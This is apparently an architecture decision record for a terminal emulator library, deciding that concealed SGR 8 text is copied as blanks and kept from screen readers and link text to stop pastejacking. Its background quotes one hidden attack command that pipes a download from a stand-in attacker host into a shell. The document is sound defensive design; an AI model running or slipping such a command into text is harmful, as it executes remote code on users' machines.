# Concealed text is not copied or exposed to accessibility

- Status: Provisional (the policy decided by a human on 2026-10-22; the blanks in place of the text chosen by an agent)
- Date: 2026-10-22
- Related: Requirements 6.1 and 6.3, sections 4, 6.1, and 11 of [compose-input.md](../design/compose-input.md), [0015](0015-accessibility.md), [0019](0019-extensibility.md), [0047](0047-search.md), `visibleTextAt` in `TerminalSelection.kt`

## Background

The display does not draw concealed cells (SGR 8). Links ([0019](0019-extensibility.md)) and search ([0047](0047-search.md), item 5) already leave them out as text the user cannot see. Copying and the rows exposed to accessibility services still gave their characters, so a host could show `echo hi` and hide `; curl evil.example | sh` on the same line: a user who copies the line they see and pastes it elsewhere sends the hidden command (pastejacking), and a screen reader reads text that is not on the screen. xterm copies concealed text.

## Decision

- **Concealed text is not copied, not exposed to accessibility, and not part of the text of an OSC 8 hyperlink** (decided by a human after a security review): preventing pastejacking comes before compatibility with xterm, and it agrees with links and search. The details are in sections 4, 6.1, and 11 of [compose-input.md](../design/compose-input.md).
- **A concealed cell is a blank**, as the display shows it, rather than left out: the copy is what the user sees, the columns of a table stay in place, and blanks at the end of a line are dropped as other blanks are. Word selection takes a concealed cell as blank too.
- **The rule is in vtfx-compose** (`visibleTextAt`), which reads the cells for each of these; `LineSnapshot.text()` of the core keeps giving the characters of the model, which apps without a UI may need.

## Alternatives considered

- **Copy concealed text, as xterm does**: the pastejacking above. Rejected by the human decision.
- **Leave the concealed characters out without a blank**: also hides them, but joins the text around them, which then differs from what the display shows (`a`, a concealed `b`, `c` would copy as `ac`).
- **Leave it out in the core**, in `LineSnapshot.text()` and `textAt`: would also hide it from search and links, which already handle it, and from apps that read the model on purpose.

Text drawn in the background's color cannot be told from the cells and is still copied, as [0019](0019-extensibility.md) accepts for links.

## Impact of reversing

Copying, the rows' semantics, and the text of hyperlinks would read `textAt` again, and sections 4, 6.1, and 11 of compose-input.md would lose the rule. The tests of concealed text in `TerminalStateTest` and `TerminalSemanticsTest` would be reversed.
